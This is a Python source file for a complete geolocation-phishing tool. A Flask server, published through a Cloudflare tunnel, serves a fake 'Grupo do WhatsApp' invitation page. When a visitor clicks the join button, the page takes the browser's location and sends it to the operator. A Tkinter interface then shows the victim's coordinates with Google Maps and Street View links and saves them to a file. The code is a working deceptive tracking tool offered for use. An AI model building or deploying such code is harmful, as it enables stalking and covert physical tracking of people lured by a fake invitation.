import threading
import webbrowser
import subprocess
import requests
import time
from flask import Flask, request, render_template_string
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog, simpledialog
import queue
import logging
import re

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
fila = queue.Queue()

ultima_lat = None
ultima_lon = None
cloudflared_process = None
image_path = None

html_page = '''
<!DOCTYPE html>
<html>
<head>
    <title>Grupo do WhatsApp</title>
    <meta charset="UTF-8">
    <style>
        body { margin: 0; padding: 20px; font-family: Arial; background: #f9f9f9; text-align: center; }
        .whatsapp-button {
            background-color: #25D366; color: white; font-weight: bold; font-size: 18px; border: none;
            border-radius: 25px; padding: 12px 30px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }
        .group-image { max-width: 300px; margin: 20px auto; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
    </style>
</head>
<body>
    <h1>Grupo do WhatsApp</h1>
    {% if image_path %}
        <img src="{{ image_path }}" alt="Imagem do Grupo" class="group-image">
    {% endif %}
    <p id="status"></p>
    <button class="whatsapp-button" onclick="entrarNoGrupo()">Entrar no grupo</button>
    <script>
        const grupoLink = "https://chat.whatsapp.com/seulinkdegrupo";
        function entrarNoGrupo() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                    }).then(() => window.open(grupoLink, '_blank'))
                      .catch(() => alert("Erro ao enviar localização."));
                }, () => {
                    alert("Permissão negada.");
                    window.open(grupoLink, '_blank');
                });
            }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html_page, image_path=image_path)

@app.route('/location', methods=['POST'])
def location():
    global ultima_lat, ultima_lon
    data = request.get_json()
    ultima_lat = data.get('latitude')
    ultima_lon = data.get('longitude')
    maps = f"https://www.google.com/maps?q={ultima_lat},{ultima_lon}\n"
    street = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={ultima_lat},{ultima_lon}\n"
    texto = f"\n(latitude,longitude): {ultima_lat},{ultima_lon}\n{maps}{street}\n"
    fila.put(texto)
    return '', 200

def rodar_servidor():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def iniciar_cloudflared():
    global cloudflared_process
    cloudflared_process = subprocess.Popen(
        ['cloudflared', 'tunnel', '--url', 'http://localhost:5000'],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    for _ in range(30):
        line = cloudflared_process.stdout.readline()
        if "trycloudflare.com" in line:
            match = re.search(r'https://[^\s]+', line)
            if match:
                return match.group(0)
        time.sleep(0.5)
    return None

class AppGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Geolocation Server")

        self.tunnel_url = None

        self.label_status = tk.Label(master, text="Servidor parado", fg="blue")
        self.label_status.pack(pady=5)

        self.btn_iniciar = tk.Button(master, text="Iniciar Servidor Cloudflare Tunnel", command=self.iniciar_cloudflare)
        self.btn_iniciar.pack(pady=5)

        self.btn_abrir_tunnel = tk.Button(master, text="Abrir Link do Tunnel", command=self.abrir_tunnel, state=tk.DISABLED)
        self.btn_abrir_tunnel.pack(pady=5)

        self.btn_parar = tk.Button(master, text="Parar Túnel", command=self.parar_tunel, state=tk.DISABLED)
        self.btn_parar.pack(pady=5)

        self.btn_google = tk.Button(master, text="Abrir Google Maps", command=self.abrir_google_maps, state=tk.DISABLED)
        self.btn_google.pack(pady=5)

        self.btn_street = tk.Button(master, text="Abrir Street View", command=self.abrir_street_view, state=tk.DISABLED)
        self.btn_street.pack(pady=5)

        self.btn_imagem = tk.Button(master, text="Definir URL da Imagem", command=self.definir_imagem)
        self.btn_imagem.pack(pady=5)

        self.btn_salvar = tk.Button(master, text="Salvar Resultados", command=self.salvar)
        self.btn_salvar.pack(pady=5)

        self.output = scrolledtext.ScrolledText(master, width=100, height=20)
        self.output.pack(padx=10, pady=10)

        self.servidor_thread = None
        self.atualizar_texto()

    def iniciar_cloudflare(self):
        if self.servidor_thread and self.servidor_thread.is_alive():
            messagebox.showinfo("Aviso", "Servidor já está rodando.")
            return

        self.label_status.config(text="Iniciando servidor Flask...")
        self.servidor_thread = threading.Thread(target=rodar_servidor, daemon=True)
        self.servidor_thread.start()
        time.sleep(1)

        self.label_status.config(text="Iniciando Cloudflare Tunnel...")
        url = iniciar_cloudflared()
        if url:
            self.tunnel_url = url
            self.label_status.config(text=f"Túnel ativo: {url}")
            self.output.insert(tk.END, f"Cloudflare Tunnel URL: {url}\n")
            self.output.see(tk.END)
            self.btn_parar.config(state=tk.NORMAL)
            self.btn_google.config(state=tk.NORMAL)
            self.btn_street.config(state=tk.NORMAL)
            self.btn_abrir_tunnel.config(state=tk.NORMAL)
        else:
            self.label_status.config(text="Erro ao iniciar túnel.")
            messagebox.showerror("Erro", "Não foi possível obter a URL do túnel.")

    def abrir_tunnel(self):
        if self.tunnel_url:
            webbrowser.open(self.tunnel_url)

    def parar_tunel(self):
        global cloudflared_process
        if cloudflared_process:
            cloudflared_process.terminate()
            cloudflared_process = None
        self.label_status.config(text="Túnel encerrado.")
        self.btn_parar.config(state=tk.DISABLED)
        self.btn_abrir_tunnel.config(state=tk.DISABLED)

    def abrir_google_maps(self):
        if ultima_lat and ultima_lon:
            webbrowser.open(f"https://www.google.com/maps?q={ultima_lat},{ultima_lon}")

    def abrir_street_view(self):
        if ultima_lat and ultima_lon:
            webbrowser.open(f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={ultima_lat},{ultima_lon}")

    def definir_imagem(self):
        global image_path
        url = simpledialog.askstring("Imagem", "Cole a URL da imagem:")
        if url:
            try:
                if requests.head(url).status_code == 200:
                    image_path = url
                    messagebox.showinfo("Sucesso", "Imagem definida com sucesso!")
                else:
                    messagebox.showerror("Erro", "URL inválida.")
            except Exception as e:
                messagebox.showerror("Erro", str(e))

    def salvar(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(self.output.get("1.0", tk.END))
            messagebox.showinfo("Salvo", "Resultados salvos com sucesso!")

    def atualizar_texto(self):
        while not fila.empty():
            msg = fila.get()
            self.output.insert(tk.END, msg)
            self.output.see(tk.END)
        self.master.after(1000, self.atualizar_texto)

if __name__ == '__main__':
    root = tk.Tk()
    app_gui = AppGUI(root)
    root.mainloop()
